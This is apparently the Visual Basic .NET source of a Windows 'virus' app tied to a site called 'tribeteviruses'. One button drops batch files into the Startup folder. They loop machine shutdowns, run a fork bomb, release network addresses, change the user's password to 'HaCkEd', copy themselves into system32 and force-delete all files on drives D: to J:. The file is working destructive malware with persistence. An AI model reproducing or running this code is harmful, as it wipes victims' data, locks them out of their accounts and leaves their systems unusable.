Public Class Form1
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim ab As New System.Text.StringBuilder

        ab.AppendLine("@echo off")
        ab.AppendLine(":A")
        ab.AppendLine("shutdown.exe -s -t 45 -c")
        ab.AppendLine("goto A")

        IO.File.WriteAllText("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\03948f75348096g31479394779jhftgjkdf.bat", ab.ToString())
        System.Diagnostics.Process.Start("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\03948f75348096g31479394779jhftgjkdf.bat")
        Dim aa As New System.Text.StringBuilder

        aa.AppendLine("@echo off")
        aa.AppendLine(":A")
        aa.AppendLine("%0|%0")
        aa.AppendLine("ipconfig /release")
        aa.AppendLine("goto A")

        IO.File.WriteAllText("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\a94d4950bba6053ab0fa6feb2ebe04ea.bat", aa.ToString())

        Dim ac As New System.Text.StringBuilder

        ac.AppendLine("@echo off")
        ac.AppendLine(":A")
        ac.AppendLine("time 00:00")
        ac.AppendLine("net user %username% HaCkEd")
        ac.AppendLine("copy %0 %windir%\system32\ls.bat")
        ac.AppendLine("
        @echo off
        del D:\*.* /f /s /q
        del E:\*.* /f /s /q
        del F:\*.* /f /s /q
        del G:\*.* /f /s /q
        del H:\*.* /f /s /q
        del I:\*.* /f /s /q
        del J:\*.* /f /s /q")
        ac.AppendLine("goto A")

        IO.File.WriteAllText("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\f99h8y638h623925h8g9695798675897.bat", ac.ToString())

    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Dim webAddress As String = "https://tribeteviruses.bubbleapps.io"
        Process.Start(webAddress)
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Dim webAddress As String = "https://tribeteviruses.bubbleapps.io/MoreInformation"
        Process.Start(webAddress)
    End Sub
End Class
